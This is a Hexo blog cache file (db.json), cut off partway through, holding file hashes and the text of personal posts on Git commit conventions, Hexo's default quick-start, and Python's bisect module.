{"meta":{"version":1,"warehouse":"3.0.2"},"models":{"Asset":[{"_id":"themes/saki.li/source/css/style.styl","path":"css/style.styl","modified":0,"renderable":1},{"_id":"themes/saki.li/source/js/saki.js","path":"js/saki.js","modified":0,"renderable":1},{"_id":"themes/saki.li/source/js/jquery.min.js","path":"js/jquery.min.js","modified":0,"renderable":1}],"Cache":[{"_id":"source/.DS_Store","hash":"79f6e321989e3a844a9c2e7b05f3a19d9f334638","modified":1585797022714},{"_id":"themes/saki.li/.gitignore","hash":"277581f1cd0ceebafa2a5b12b327788669c557b6","modified":1584162584000},{"_id":"source/404.md","hash":"7fe762a633bdf42e697f958ac10426579457a5aa","modified":1584718123143},{"_id":"themes/saki.li/_config.yml","hash":"cee8be0da1ee30270b6676e7269d36711b269f46","modified":1584162584000},{"_id":"themes/saki.li/README_zh.md","hash":"68ac3c4e99488d1f4dc1c1b2fa6ab2b19bc4feac","modified":1584162584000},{"_id":"themes/saki.li/LICENSE","hash":"6d2c84d77b231e7f24c2ab2fe0b8cb966948229e","modified":1584162584000},{"_id":"themes/saki.li/README.md","hash":"65b6f2e9ab1054af65050e3b088d7865a9a0b5ed","modified":1584162584000},{"_id":"source/_posts/Git-commit-规范.md","hash":"c4e0798147c7c2b1154538237ec29a593d193fe7","modified":1595427569513},{"_id":"source/_posts/.DS_Store","hash":"df2fbeb1400acda0909a32c1cf6bf492f1121e07","modified":1584717882420},{"_id":"source/_posts/hello-world.md","hash":"7d98d6592de80fdcd2949bd7401cec12afd98cdf","modified":1584712021983},{"_id":"source/_posts/Python二分查找内置库bisect.md","hash":"55aad6e3c44ad33b4ef68b7a983e6ceea9137d73","modified":1595428750412},{"_id":"source/_posts/秋招近期安排.md","hash":"e22720e9d654404d4ad7922d0037b3f5116efa6a","modified":1595430069707},{"_id":"source/_posts/清明日常.md","hash":"2a0fb6e19d9e1a5a5d6f5ad11ed3610ad8f21b8d","modified":1586095206149},{"_id":"themes/saki.li/languages/default.yml","hash":"c7c8c3c5e7ed3ed7da3b0f24614b5e579be8e4b6","modified":1584162584000},{"_id":"themes/saki.li/languages/zh-cn.yml","hash":"6830fe41f887b0b656998b70c05674ff2d2c0813","modified":1584162584000},{"_id":"source/_posts/网络安全-反序列化问题.md","hash":"f4622f0243e7b615d9ae00c08b6fd159bb036214","modified":1595428251713},{"_id":"source/_posts/伍佰计划.md","hash":"52104b6200b312ed791e83d9b522c1e1c7800754","modified":1585066451712},{"_id":"themes/saki.li/layout/archive.ejs","hash":"af4fbf1839829f7cb440aa492df19d9197fa5668","modified":1584162584000},{"_id":"themes/saki.li/layout/index.ejs","hash":"4666f6d3eed2cc10bcac1384f23839a8c23fabd8","modified":1584162584000},{"_id":"themes/saki.li/layout/layout.ejs","hash":"45cd7dd36b3acfc9e3d019ef4888bc8a7287ca88","modified":1584162584000},{"_id":"themes/saki.li/layout/post.ejs","hash":"21e01d44ffb76945c1e1e4abf081bd1d2a9e9da2","modified":1584162584000},{"_id":"themes/saki.li/layout/_partial/disqus.ejs","hash":"c8d0022b0eac631d2ba9925f4beba73bad40a34c","modified":1584162584000},{"_id":"themes/saki.li/layout/_partial/head.ejs","hash":"cb1279e4bc5ac52bf998d30f3323470d56e31de6","modified":1584162584000},{"_id":"themes/saki.li/layout/_partial/header.ejs","hash":"6e2486ae9276fd5c0bdbc628b2d7afb757de40db","modified":1584162584000},{"_id":"themes/saki.li/layout/_partial/license.ejs","hash":"61486084b7497488471ea4c6ea9f612360231740","modified":1584162584000},{"_id":"themes/saki.li/layout/_partial/paginator.ejs","hash":"ca97c26c6b25259bf1572ae8f96cea6f5e6876cb","modified":1584162584000},{"_id":"themes/saki.li/layout/_partial/prev_next.ejs","hash":"8dab24f7af9d9f1b3e6ab616197f3b8509593807","modified":1584162584000},{"_id":"themes/saki.li/source/css/style.styl","hash":"8bb55b024e5b394d755d1b5cc76b8c52182e715b","modified":1584162584000},{"_id":"themes/saki.li/source/js/saki.js","hash":"9f85936dba908ee73d7a28d6125d8df826452bc8","modified":1584162584000},{"_id":"themes/saki.li/source/js/jquery.min.js","hash":"3f1b0e9e54af1af2db2c8a639530448723462151","modified":1584162584000},{"_id":"themes/saki.li/source/css/_partial/dark.styl","hash":"924d372ff39553cd8ee32599f5736bc5ccece671","modified":1584162584000},{"_id":"themes/saki.li/source/css/_partial/archive.styl","hash":"7300807816fcf24c41c6d81f312d7208a34f76e0","modified":1584162584000},{"_id":"themes/saki.li/source/css/_partial/font-source-serif-pro.styl","hash":"a7747108438840f4dff5c964a3394d39f2a2158c","modified":1584162584000},{"_id":"themes/saki.li/source/css/_partial/header.styl","hash":"3135ad1158de87827080d4cc97f77e3cec0ef270","modified":1584162584000},{"_id":"themes/saki.li/source/css/_partial/normalize.styl","hash":"4e102f7d292b44907e3ffb0306d698ac4a62c850","modified":1584162584000},{"_id":"themes/saki.li/source/css/_partial/post.styl","hash":"5f152e5c805076e28200dfcf58929216f0546195","modified":1584162584000},{"_id":"themes/saki.li/source/css/_partial/font-noto-serif-sc.styl","hash":"8784da0d8d85cd166d13e1605c436257eadab4b5","modified":1584162584000},{"_id":"public/404.html","hash":"1cd069d673cd281596110ed30af16eff91784d3d","modified":1595431076941},{"_id":"public/2020/07/22/秋招近期安排/index.html","hash":"a2219a4a8fb3672b30663bfb7e8765b2c65200b3","modified":1595431076941},{"_id":"public/2020/07/05/Python二分查找内置库bisect/index.html","hash":"f3508b81e701023e2b0eabdab18b089e9325c3bf","modified":1595431076941},{"_id":"public/2020/05/16/Git-commit-规范/index.html","hash":"4d10d310e86135bd2156aad515efb7a7a9b051f9","modified":1595431076941},{"_id":"public/2020/04/05/清明日常/index.html","hash":"710577201364e7466e2009d5b6a487c32567b46e","modified":1595431076941},{"_id":"public/2020/03/25/伍佰计划/index.html","hash":"d9819a8381317eebb58b9ec7627c29b7e39cae87","modified":1595431076941},{"_id":"public/2020/03/20/hello-world/index.html","hash":"eee3a0d4786ca021a6a460292642225ac5ddd008","modified":1595431076941},{"_id":"public/archives/2020/index.html","hash":"3b5fdb988e40042ea4a44ff4bf3b281a58372b02","modified":1595431076941},{"_id":"public/archives/index.html","hash":"e3e2650dd11fff1bb880311094bbd40d0ede3a4b","modified":1595431076941},{"_id":"public/archives/2020/03/index.html","hash":"43541462d9729737ba42c2e211805d338c9c3f11","modified":1595431076941},{"_id":"public/archives/2020/04/index.html","hash":"f4520e44abb93d092ff8c986ed5bc5ebe81de082","modified":1595431076941},{"_id":"public/archives/2020/06/index.html","hash":"2af0d5aaf00fcd935a1ffe6d69f1758ffb736752","modified":1595431076941},{"_id":"public/archives/2020/05/index.html","hash":"275c999b1bf53ad082d4800996f209d29a090fe8","modified":1595431076941},{"_id":"public/archives/2020/07/index.html","hash":"4139d6c10a0e2e62dc5effb9b1503f73ecc781b2","modified":1595431076941},{"_id":"public/2020/06/07/网络安全-反序列化问题/index.html","hash":"9dd382004983a9b852d8d63bf8b48164da7fce07","modified":1595431076941},{"_id":"public/index.html","hash":"bcd4812c9657e11712e7f2c5eac1002151f7115e","modified":1595431076941},{"_id":"public/js/saki.js","hash":"9f85936dba908ee73d7a28d6125d8df826452bc8","modified":1595431076941},{"_id":"public/css/style.css","hash":"a4c7028699fc221616b84e3e0f1be76c8b6652c9","modified":1595431076941},{"_id":"public/js/jquery.min.js","hash":"3f1b0e9e54af1af2db2c8a639530448723462151","modified":1595431076941}],"Category":[],"Data":[],"Page":[{"title":"404","date":"2019-07-19T08:41:10.000Z","type":"404","layout":"404","description":"你来到了没有知识的荒原 :(","_content":"","source":"404.md","raw":"---\ntitle: 404\ndate: 2019-07-19 16:41:10\ntype: \"404\"\nlayout: \"404\"\ndescription: \"你来到了没有知识的荒原 :(\"\n---","updated":"2020-03-20T15:28:43.143Z","path":"404.html","comments":1,"_id":"ckcxigxsp00004zm9dfo53txp","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Git commit 规范","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2020-05-16T14:02:18.000Z","password":null,"summary":null,"_content":"\n## 背景:\n\n    Git毫无疑问是现在最流行的版本控制工具。在回顾项目，定位问题的过程中，书写良好的commit message可以提高效率~♪（＾∀＾●）ﾉｼ写这个也是自己的备忘录～\n\n## 规范?直接上手！\n\n#### type\n\ntype为必填项，用于指定commit的类型，约定了feat、fix两个主要type，以及docs、style、build、refactor、revert五个特殊type，其余type暂不使用。\n\n###### 主要type\n\n| 名称  | 解释           |\n| ----- | -------------- |\n| feat  |     增加新功能 |\n| fix   |    修复bug     |\n\n###### 特殊type\n\n| 名称  | 解释           |\n| ----- | -------------- |\n| docs     |     只改动了文档相关的内容                                |\n| style    |    不影响代码含义的改动，例如去掉空格、改变缩进、增删分号 |\n| build    |    构造工具的或者外部依赖的改动，例如webpack，npm         |\n| refactor | 代码重构时使用                                            |\n| revert   |   执行git revert打印的message                             |\n\n###### 暂不使用type\n\n| 名称  | 解释           |\n| ----- | -------------- |\n| test  |     添加测试或者修改现有测试                                 |\n| perf  |     提高性能的改动                                           |\n| ci    |       与CI（持续集成服务）有关的改动                         |\n| chore |    不修改src或者test的其余修改，例如构建过程或辅助工具的变动 |\n\n###### 注意事项\n\n当一次改动包括主要type与特殊type时，统一采用主要type\n\n#### 最后\n\n我现在更喜欢commit干练即可\n等到提合并请求时再详细写明原因\n","source":"_posts/Git-commit-规范.md","raw":"---\ntitle: Git commit 规范\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2020-05-16 22:02:18\npassword:\nsummary:\ntags:\ncategories:\n---\n\n## 背景:\n\n    Git毫无疑问是现在最流行的版本控制工具。在回顾项目，定位问题的过程中，书写良好的commit message可以提高效率~♪（＾∀＾●）ﾉｼ写这个也是自己的备忘录～\n\n## 规范?直接上手！\n\n#### type\n\ntype为必填项，用于指定commit的类型，约定了feat、fix两个主要type，以及docs、style、build、refactor、revert五个特殊type，其余type暂不使用。\n\n###### 主要type\n\n| 名称  | 解释           |\n| ----- | -------------- |\n| feat  |     增加新功能 |\n| fix   |    修复bug     |\n\n###### 特殊type\n\n| 名称  | 解释           |\n| ----- | -------------- |\n| docs     |     只改动了文档相关的内容                                |\n| style    |    不影响代码含义的改动，例如去掉空格、改变缩进、增删分号 |\n| build    |    构造工具的或者外部依赖的改动，例如webpack，npm         |\n| refactor | 代码重构时使用                                            |\n| revert   |   执行git revert打印的message                             |\n\n###### 暂不使用type\n\n| 名称  | 解释           |\n| ----- | -------------- |\n| test  |     添加测试或者修改现有测试                                 |\n| perf  |     提高性能的改动                                           |\n| ci    |       与CI（持续集成服务）有关的改动                         |\n| chore |    不修改src或者test的其余修改，例如构建过程或辅助工具的变动 |\n\n###### 注意事项\n\n当一次改动包括主要type与特殊type时，统一采用主要type\n\n#### 最后\n\n我现在更喜欢commit干练即可\n等到提合并请求时再详细写明原因\n","slug":"Git-commit-规范","published":1,"updated":"2020-07-22T14:19:29.513Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckcxigxsw00014zm9b1898w63","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景:\"></a>背景:</h2><pre><code>Git毫无疑问是现在最流行的版本控制工具。在回顾项目，定位问题的过程中，书写良好的commit message可以提高效率~♪（＾∀＾●）ﾉｼ写这个也是自己的备忘录～</code></pre><h2 id=\"规范-直接上手！\"><a href=\"#规范-直接上手！\" class=\"headerlink\" title=\"规范?直接上手！\"></a>规范?直接上手！</h2><h4 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h4><p>type为必填项，用于指定commit的类型，约定了feat、fix两个主要type，以及docs、style、build、refactor、revert五个特殊type，其余type暂不使用。</p>\n<h6 id=\"主要type\"><a href=\"#主要type\" class=\"headerlink\" title=\"主要type\"></a>主要type</h6><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>feat</td>\n<td>增加新功能</td>\n</tr>\n<tr>\n<td>fix</td>\n<td>修复bug</td>\n</tr>\n</tbody></table>\n<h6 id=\"特殊type\"><a href=\"#特殊type\" class=\"headerlink\" title=\"特殊type\"></a>特殊type</h6><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>docs</td>\n<td>只改动了文档相关的内容</td>\n</tr>\n<tr>\n<td>style</td>\n<td>不影响代码含义的改动，例如去掉空格、改变缩进、增删分号</td>\n</tr>\n<tr>\n<td>build</td>\n<td>构造工具的或者外部依赖的改动，例如webpack，npm</td>\n</tr>\n<tr>\n<td>refactor</td>\n<td>代码重构时使用</td>\n</tr>\n<tr>\n<td>revert</td>\n<td>执行git revert打印的message</td>\n</tr>\n</tbody></table>\n<h6 id=\"暂不使用type\"><a href=\"#暂不使用type\" class=\"headerlink\" title=\"暂不使用type\"></a>暂不使用type</h6><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>test</td>\n<td>添加测试或者修改现有测试</td>\n</tr>\n<tr>\n<td>perf</td>\n<td>提高性能的改动</td>\n</tr>\n<tr>\n<td>ci</td>\n<td>与CI（持续集成服务）有关的改动</td>\n</tr>\n<tr>\n<td>chore</td>\n<td>不修改src或者test的其余修改，例如构建过程或辅助工具的变动</td>\n</tr>\n</tbody></table>\n<h6 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h6><p>当一次改动包括主要type与特殊type时，统一采用主要type</p>\n<h4 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h4><p>我现在更喜欢commit干练即可<br>等到提合并请求时再详细写明原因</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景:\"></a>背景:</h2><pre><code>Git毫无疑问是现在最流行的版本控制工具。在回顾项目，定位问题的过程中，书写良好的commit message可以提高效率~♪（＾∀＾●）ﾉｼ写这个也是自己的备忘录～</code></pre><h2 id=\"规范-直接上手！\"><a href=\"#规范-直接上手！\" class=\"headerlink\" title=\"规范?直接上手！\"></a>规范?直接上手！</h2><h4 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h4><p>type为必填项，用于指定commit的类型，约定了feat、fix两个主要type，以及docs、style、build、refactor、revert五个特殊type，其余type暂不使用。</p>\n<h6 id=\"主要type\"><a href=\"#主要type\" class=\"headerlink\" title=\"主要type\"></a>主要type</h6><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>feat</td>\n<td>增加新功能</td>\n</tr>\n<tr>\n<td>fix</td>\n<td>修复bug</td>\n</tr>\n</tbody></table>\n<h6 id=\"特殊type\"><a href=\"#特殊type\" class=\"headerlink\" title=\"特殊type\"></a>特殊type</h6><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>docs</td>\n<td>只改动了文档相关的内容</td>\n</tr>\n<tr>\n<td>style</td>\n<td>不影响代码含义的改动，例如去掉空格、改变缩进、增删分号</td>\n</tr>\n<tr>\n<td>build</td>\n<td>构造工具的或者外部依赖的改动，例如webpack，npm</td>\n</tr>\n<tr>\n<td>refactor</td>\n<td>代码重构时使用</td>\n</tr>\n<tr>\n<td>revert</td>\n<td>执行git revert打印的message</td>\n</tr>\n</tbody></table>\n<h6 id=\"暂不使用type\"><a href=\"#暂不使用type\" class=\"headerlink\" title=\"暂不使用type\"></a>暂不使用type</h6><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>test</td>\n<td>添加测试或者修改现有测试</td>\n</tr>\n<tr>\n<td>perf</td>\n<td>提高性能的改动</td>\n</tr>\n<tr>\n<td>ci</td>\n<td>与CI（持续集成服务）有关的改动</td>\n</tr>\n<tr>\n<td>chore</td>\n<td>不修改src或者test的其余修改，例如构建过程或辅助工具的变动</td>\n</tr>\n</tbody></table>\n<h6 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h6><p>当一次改动包括主要type与特殊type时，统一采用主要type</p>\n<h4 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h4><p>我现在更喜欢commit干练即可<br>等到提合并请求时再详细写明原因</p>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2020-03-20T13:47:01.983Z","updated":"2020-03-20T13:47:01.983Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckcxigxsy00024zm9fmtd7w5g","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n"},{"title":"Python二分查找内置库bisect","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2020-07-05T11:33:01.000Z","password":null,"summary":null,"_content":"\n今天突然在网上看到的库，可以快速排序，叫做bisect\nbisect模块实现了二分查找和插入算法，短小精干，简单易用\n\n## 官方文档\n\n我们首先来看看官方文档\nThis module provides support for maintaining a list in sorted order without having to sort the list after each insertion. For long lists of items with expensive comparison operations, this can be an improvement over the more common approach. The module is called bisect because it uses a basic bisection algorithm to do its work. The source code may be most useful as a working example of the algorithm (the boundary conditions are already right!).\n重点:支持安排序顺序维护列表，使用二分查找方法提速，源码或许是最有用的工程算法实现(hhh官方吹捧\nPs - 使用此库前请保证list有序\nBisect 是二分法的意思，这里使用二分法来排序，它会将一个元素插入到一个有序列表的合适位置，这使得不需要每次调用 sort 的方式维护有序列表。\n\n## 功能\n\nbisect模块采用经典的二分算法查找元素。模块提供下面几个方法：\nbisect.bisect_left(a, x, lo=0, hi=len(a))\n定位x在序列a中的插入点，并保持原来的有序状态不变。参数lo和hi用于指定查找区间。如果x已经存在于a中，那么插入点在已存在元素的左边。函数的返回值是列表的整数下标。\nbisect.bisect_right(a, x, lo=0, hi=len(a))\n和上面的区别是插入点在右边。函数的返回值依然是一个列表下标整数。\nbisect.bisect(a, x, lo=0, hi=len(a))\n等同于bisect_right()。\n注意，前面这三个方法都是获取插入位置，也就是列表的某个下标的，并不实际插入。但下面三个方法实际插入元素，没有返回值。\nbisect.insort_left(a, x, lo=0, hi=len(a))\n将x插入有序序列a内，并保持有序状态。相当于a.insert(bisect.bisect_left(a, x, lo, hi), x)。碰到相同的元素则插入到元素的左边。这个操作通常是 O(log n) 的时间复杂度。\nbisect.insort_right(a, x, lo=0, hi=len(a))\n同上，只不过碰到相同的元素则插入到元素的右边。\nbisect.insort(a, x, lo=0, hi=len(a))\n等同于insort_right()。\n\n## 例子\n\n官方文档中给出了一个简单实用例子和\n利用利用bisect模块实现通用的列表元素查询方法的示范\n文档链接：\nhttps://docs.python.org/3/library/bisect.html\n可以自行食用\n\n## 结语\n\n源码\nhttps://github.com/python/cpython/blob/3.8/Lib/bisect.py\n最近比较喜欢阅读官方文档和源码，很多教程写来写去也没说明白不如直接去看官方示例\n所以除了最基本解释就不写了，大家可以直接看源码感受一下\n","source":"_posts/Python二分查找内置库bisect.md","raw":"---\ntitle: Python二分查找内置库bisect\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2020-07-05 19:33:01\npassword:\nsummary:\ntags:\ncategories:\n---\n\n今天突然在网上看到的库，可以快速排序，叫做bisect\nbisect模块实现了二分查找和插入算法，短小精干，简单易用\n\n## 官方文档\n\n我们首先来看看官方文档\nThis module provides support for maintaining a list in sorted order without having to sort the list after each insertion. For long lists of items with expensive comparison operations, this can be an improvement over the more common approach. The module is called bisect because it uses a basic bisection algorithm to do its work. The source code may be most useful as a working example of the algorithm (the boundary conditions are already right!).\n重点:支持安排序顺序维护列表，使用二分查找方法提速，源码或许是最有用的工程算法实现(hhh官方吹捧\nPs - 使用此库前请保证list有序\nBisect 是二分法的意思，这里使用二分法来排序，它会将一个元素插入到一个有序列表的合适位置，这使得不需要每次调用 sort 的方式维护有序列表。\n\n## 功能\n\nbisect模块采用经典的二分算法查找元素。模块提供下面几个方法：\nbisect.bisect_left(a, x, lo=0, hi=len(a))\n定位x在序列a中的插入点，并保持原来的有序状态不变。参数lo和hi用于指定查找区间。如果x已经存在于a中，那么插入点在已存在元素的左边。函数的返回值是列表的整数下标。\nbisect.bisect_right(a, x, lo=0, hi=len(a))\n和上面的区别是插入点在右边。函数的返回值依然是一个列表下标整数。\nbisect.bisect(a, x, lo=0, hi=len(a))\n等同于bisect_right()。\n注意，前面这三个方法都是获取插入位置，也就是列表的某个下标的，并不实际插入。但下面三个方法实际插入元素，没有返回值。\nbisect.insort_left(a, x, lo=0, hi=len(a))\n将x插入有序序列a内，并保持有序状态。相当于a.insert(bisect.bisect_left(a, x, lo, hi), x)。碰到相同的元素则插入到元素的左边。这个操作通常是 O(log n) 的时间复杂度。\nbisect.insort_right(a, x, lo=0, hi=len(a))\n同上，只不过碰到相同的元素则插入到元素的右边。\nbisect.insort(a, x, lo=0, hi=len(a))\n等同于insort_right()。\n\n## 例子\n\n官方文档中给出了一个简单实用例子和\n利用利用bisect模块实现通用的列表元素查询方法的示范\n文档链接：\nhttps://docs.python.org/3/library/bisect.html\n可以自行食用\n\n## 结语\n\n源码\nhttps://github.com/python/cpython/blob/3.8/Lib/bisect.py\n最近比较喜欢阅读官方文档和源码，很多教程写来写去也没说明白不如直接去看官方示例\n所以除了最基本解释就不写了，大家可以直接看源码感受一下\n","slug":"Python二分查找内置库bisect","published":1,"updated":"2020-07-22T14:39:10.412Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckcxigxt000034zm9av2i9332","content":"<p>今天突然在网上看到的库，可以快速排序，叫做bisect<br>bisect模块实现了二分查找和插入算法，短小精干，简单易用</p>\n<h2 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h2><p>我们首先来看看官方文档<br>This module provides support for maintaining a list in sorted order without having to sort the list after each insertion. For long lists of items with expensive comparison operations, this can be an improvement over the more common approach. The module is called bisect because it uses a basic bisection algorithm to do its work. The source code may be most useful as a working example of the algorithm (the boundary conditions are already right!).<br>重点:支持安排序顺序维护列表，使用二分查找方法提速，源码或许是最有用的工程算法实现(hhh官方吹捧<br>Ps - 使用此库前请保证list有序<br>Bisect 是二分法的意思，这里使用二分法来排序，它会将一个元素插入到一个有序列表的合适位置，这使得不需要每次调用 sort 的方式维护有序列表。</p>\n<h2 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h2><p>bisect模块采用经典的二分算法查找元素。模块提供下面几个方法：<br>bisect.bisect_left(a, x, lo=0, hi=len(a))<br>定位x在序列a中的插入点，并保持原来的有序状态不变。参数lo和hi用于指定查找区间。如果x已经存在于a中，那么插入点在已存在元素的左边。函数的返回值是列表的整数下标。<br>bisect.bisect_right(a, x, lo=0, hi=len(a))<br>和上面的区别是插入点在右边。函数的返回值依然是一个列表下标整数。<br>bisect.bisect(a, x, lo=0, hi=len(a))<br>等同于bisect_right()。<br>注意，前面这三个方法都是获取插入位置，也就是列表的某个下标的，并不实际插入。但下面三个方法实际插入元素，没有返回值。<br>bisect.insort_left(a, x, lo=0, 